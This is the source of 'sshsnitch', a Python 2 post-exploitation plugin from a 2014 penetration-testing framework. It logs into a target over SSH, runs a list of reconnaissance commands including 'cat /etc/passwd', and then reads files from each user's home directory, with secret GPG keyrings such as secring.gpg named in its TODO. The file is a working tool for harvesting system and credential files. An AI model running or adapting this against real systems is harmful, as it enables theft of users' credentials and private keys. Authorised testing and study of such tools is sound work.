##
# TODO
# Copyright (c) 2014, curesec GmbH
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of 
# conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list 
# of conditions and the following disclaimer in the documentation and/or other materials 
# provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used 
# to endorse or promote products derived from this software without specific prior written 
# permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF 
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE 
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR 
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
# add parsing of users in /etc/passwd and check for those files on all userhomes
#    gpg.conf
#    pubring.gpg
#    pubring.gpg~
#    random_seed
#    secring.gpg
#    trustdb.gpg


#from ccdClasses import Plugin, InvalidArgumentError
import ccdClasses as ccd

#import interactive
import __builtin__
import logging
import getopt
import time
import sys
import socket

from ctools.sshlib import sshClass

LOG_IP = "127.0.0.1"
LOG_PORT = 3002

def main(dbh, args):
    #sh = logging.handlers.SocketHandler(LOG_IP, LOG_PORT)
    #sh.setLevel(logging.DEBUG)

    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    #logger.addHandler(sh)
    logger.debug("starting plugin %s" % __name__)

    parsed_args = parseInput(args, logger)
    if parsed_args == -1:
        return -1

    logger.debug("parsed_args:%s", parsed_args)
    sshsnitch(parsed_args, logger)

    return True

def sshsnitch(args, logger):
    """ sshsnitchy """

    #is ccd calling us? if so put it to 1
    #callback = 1

    logger.debug("creating sshClass..")
    sshC = sshClass()

    logger.debug("creating socketClass..")

    server, port, sshC.user, sshC.password, sshC.method, sshC.keyfile, verbose = args

    if sshC.method == 'key':
        sshC.keyfile = __builtin__.openany(sshC.keyfile)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    logger.debug("assigning socket to sshC")
    sshC.s = s

    print "Connecting %s@%s:%d " % (sshC.user, server, port)

    logger.debug("creating ssh..")
    sshC.createSSH()

    logger.debug("authenticate ssh..")
    sshC.authSSH()

    fu = __builtin__.openany("unix_snitch.txt", "r")
    usnitch = fu.readlines()

    #add better loop for recv data
    #FIXME
    pwflag = False
    pw = ''
    for cmd in usnitch:
        if not cmd.startswith("#"):

            print "Executing: %s" % (cmd)
            sess = sshC.pm.open_channel('session')
            sess.exec_command(cmd)
            if cmd == "cat /etc/passwd\n":
                print "got passwd"
                pwflag = True
            # added time.sleep here as the remote system sometimes is quite slow in filling the pipe
            # however we dont want to miss anything, there is probably a better solution, but this one works as well ;)
            while 1:
                time.sleep(0.5)
                if sess.recv_ready():
                    data = sess.recv(8096)
                    print data
                    if pwflag:
                        pw = pw.join(data)
                else:
                    break

            pwflag = False
            #lets get errors as well
            if verbose:
                data = sess.recv_stderr(8096)
                print data
            print "-" * 80
        else:
            print "Section or Comment: %s" % cmd

    print "Unix Snitch got returned."
    print "And found passwd, lets analyse it"
    print pw
    pw = pw.split("\n")
    pw.remove('')

    fu.close()

    fu = __builtin__.openany("unix_snitch_home.txt", "r")
    homesearch = []
    homesearch = fu.readlines()

    for line in pw:
        pwsp = line.split(":")
        user = pwsp[0]
        shell = pwsp[6]
        uhome = pwsp[5]
        print "Checking user [%s] with shell [%s]" % (user, shell)

        for hs in homesearch:
            cmd = "cat %s/%s" % (uhome, hs)
            if not hs.startswith("#"):

                print "Executing: %s" % (cmd)
                sess = sshC.pm.open_channel('session')
                sess.exec_command(cmd)
                while 1:
                    time.sleep(0.5)
                    if sess.recv_ready():
                        data = sess.recv(8096)
                        print data
                    else:
                        break
                #lets get errors as well
                if verbose:
                    data = sess.recv_stderr(8096)
                    print data
                print "-" * 80
            else:
                print "Section or Comment: %s" % cmd

    logging.debug("close")
    sess.close()

    return -1


def usage():
    """ my awesome usage """
    print "-" * 80
    print "ssh snitchy, grab remote information"
    print
    print "-s <server>"
    print "-P <port> [default: 22]"
    print "-u <user>"
    print "-p <password>"
    print "-e <method> [default: password]"
    print "   supportet: password, key"
    print "-k keyfile"
    print "-h help"
    print "-" * 80

def register():
    # returns plugin name and list of plugins category
    # the name must equal directory name of plugin
    plugin = ccd.Plugin("sshsnitch", ["postex"])
    plugin.execute = main
    return plugin

def parseInput(args, logger):
    """ parse the input for the script """

    logger.debug("parsing input")

    #set variables to none
    server = None
    user = None
    password = None
    port = 22
    method = 'password'
    key = None
    helpme = 0
    verbose = False

    # now get command line args
    try:
        opts, rest = getopt.getopt(args, "s:u:p:e:k:hP:")
    except:
        logger.error("invalid argument")
        return usage()

    for opt, arg in opts:
        if opt == "-s":
            server = arg
        elif opt == "-u":
            user = arg
        elif opt == "-v":
            verbose = True
        elif opt == "-p":
            password = arg
        elif opt == "-P":
            port = int(arg)
        elif opt == "-e":
            method = arg
        elif opt == "-k":
            key = arg
        elif opt == "-h":
            helpme == 1
        else:
            logger.debug(usage())
            return None

    if helpme == 1:
        usage()
        return -1

    if method == 'key' and key is None:
        print "Error: Define path to key!"
        usage()

    if server is None or user is None:
        usage()
        return -1

    logger.debug(server)
    logger.debug(port)
    logger.debug(user)

    return (server, port, user, password, method, key, verbose)

if __name__ == '__main__':
    main(None, sys.argv[1:])
